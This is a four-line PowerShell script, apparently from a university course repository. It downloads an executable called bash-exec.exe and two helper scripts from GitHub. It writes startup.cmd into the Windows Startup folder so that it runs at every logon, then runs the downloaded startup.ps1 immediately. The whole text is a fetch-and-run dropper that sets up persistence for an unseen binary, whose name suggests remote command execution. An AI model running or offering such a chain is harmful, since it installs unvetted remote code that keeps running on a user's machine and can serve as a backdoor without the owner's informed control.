Invoke-WebRequest -Uri https://github.com/FH-Muenster-Studium/DuN-bash-exec/raw/main/bash-exec.exe -OutFile $env:userprofile\bash-exec.exe
Invoke-WebRequest -Uri https://github.com/FH-Muenster-Studium/DuN-bash-exec/raw/main/startup.ps1 -OutFile $env:userprofile\startup.ps1
Invoke-WebRequest -Uri https://github.com/FH-Muenster-Studium/DuN-bash-exec/raw/main/startup.cmd -OutFile $env:userprofile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.cmd
$env:userprofile\startup.ps1